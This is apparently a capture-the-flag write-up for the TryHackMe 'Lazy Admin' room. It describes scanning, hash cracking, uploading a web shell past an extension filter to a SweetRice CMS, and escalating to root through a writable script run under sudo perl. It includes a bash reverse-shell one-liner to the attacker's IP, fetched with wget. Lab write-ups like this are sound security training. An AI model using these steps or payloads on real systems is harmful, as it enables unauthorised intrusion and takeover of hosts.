# Lazy Admin 

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg)

## Difficulty = Easy

***

Running our nmap scan we have -:


```bash
# Nmap 7.94 scan initiated Wed Oct 18 04:25:37 2023 as: nmap -p22,80 -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.65.43
Nmap scan report for 10.10.65.43
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 18 04:25:55 2023 -- 1 IP address (1 host up) scanned in 18.84 seconds
```

Nice⚡, we have port `80` and `22` opened, Navigating to port `80/HTTP` we have a default Apache web page

![](https://i.imgur.com/xxzn8ql.png)



Running `ffuf` for dir/file bruteforce, we found 2 entries

![](https://i.imgur.com/02hSyX3.png)

Navigating to `/content` we have a **sweet rice** CMS page

![](https://i.imgur.com/LqnW8jw.png)

- Viewing-Page Source we know **sweet rice CMS** runs on version 0.5.4
- We found exploit on `searchsploit` but none seems to work

![](https://i.imgur.com/NMEeEJj.png)


Decided to run a dir/file bruteforce on `/content` and we have this -:


![](https://i.imgur.com/xRg3Zar.png)


Navigating to `/content/as` we found a login page


![](https://i.imgur.com/srSvAUz.png)

Tried out several attempts to login but none worked, decided to enumerate harder.

![](https://i.pinimg.com/736x/38/d7/96/38d796426dd19ebb4dac9f286f5cd435.jpg)

Navigating to the `/content/inc` folder we found a mysql backup directory


![](https://i.imgur.com/vA2A7Rn.png)

We can then download the backup file 

![](https://i.imgur.com/mVJfsfe.png)

Viewing the file we have a password hash in `MD5` and a username


![](https://i.imgur.com/JVnGQoo.png)

Cracking it with `hashcat`, we found a password

```bash
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -O
```


![](https://i.imgur.com/phmOUa4.png)


Navigating to media center we can upload files and the files are stored under `/attachment` directly

![](https://i.imgur.com/97r84Gf.png)



Uploaded our shell as `.php5` cos' it kept filtering out normal `php` extension. Navigating to where i uploaded my shell, it kept breaking it so here is what i did

![](https://i.imgur.com/48WCFcx.png)

- create a `anything.sh` file
- Paste this into the file and save

```bash
/bin/sh -i >& /dev/tcp/10.9.75.133/1337 0>&1
```

- start up a `python` server on attacker machine and download through our web shell with `wget`

```bash
# attacker machine - python
$ python3 -m http.server 80

# target web-shell - wget
$ wget anything.sh
```

- start up your listener `nc -lvnp 1337`
- On the web shell run `bash anything.sh`

![](https://i.imgur.com/RwTPpSj.png)


Navigating to our `/home` directory we have a `backup.pl` script, that runs a `copy.sh` script in the `/etc` folder


![](https://i.imgur.com/7jCqbSn.png)

Nice, we have read-write-execute access 🤖

![](https://i.imgur.com/YNwjUMV.png)

we can then add this script into the `/etc/copy.sh` file to get root


```bash
#!/bin/bash  
  
/bin/bash -i ;#
```

Also running `sudo -l` we can see that we have the permission to run the `backup.perl` file in `/home/itguy` folder, with `perl` as root

![](https://i.imgur.com/f59Jjtl.png)




Run the `backup.pl` script in `/home/itguy` directory and you should be root

```bash
$ sudo /usr/bin/perl /home/itguy/backup.pl
```

![](https://i.imgur.com/ynoCtur.png)


Have fun 😃

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>


